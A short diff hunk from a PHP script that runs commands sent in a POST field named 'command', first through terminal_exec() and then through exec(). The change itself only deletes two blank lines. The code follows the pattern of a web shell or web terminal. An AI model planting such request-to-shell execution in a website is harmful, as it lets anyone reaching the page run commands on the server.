@@ -68,8 +68,6 @@ if (isset( $_POST['command'])):
 		{
 			$output = terminal_exec($command) ;
 		}
-
-
 		// Try: exec
 		else if(function_exists('exec'))
 		{
